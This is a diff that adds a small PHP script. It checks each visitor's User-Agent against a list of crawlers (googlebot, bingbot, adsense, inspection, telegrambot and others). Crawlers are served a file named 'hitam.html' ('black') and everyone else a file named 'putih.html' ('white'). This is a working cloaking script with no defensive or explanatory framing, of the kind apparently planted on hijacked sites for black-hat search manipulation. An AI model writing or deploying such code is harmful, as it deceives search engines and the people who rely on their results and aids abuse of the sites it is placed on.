@@ -1,0 +1,40 @@
+<?php
+function getFileContent($filepath) {
+    if (file_exists($filepath) && is_readable($filepath)) {
+        return file_get_contents($filepath);
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+// Get the directory of the current script
+$currentDir = dirname(__FILE__);
+
+// Define paths to HTML files in the same directory
+$botFile = $currentDir . '/hitam.html';
+$nonBotFile = $currentDir . '/putih.html';
+
+// Get file contents
+$botContent = getFileContent($botFile);
+$nonBotContent = getFileContent($nonBotFile);
+
+// Check if files were successfully loaded
+if ($botContent === false) {
+    die("Error: Could not read hitam.html");
+}
+
+if ($nonBotContent === false) {
+    die("Error: Could not read putih.html");
+}
+
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+
+if (preg_match($botchar, $res)) {
+    echo $botContent;
+    exit;
+} else {
+    echo $nonBotContent;
+    exit;
+}
+?>
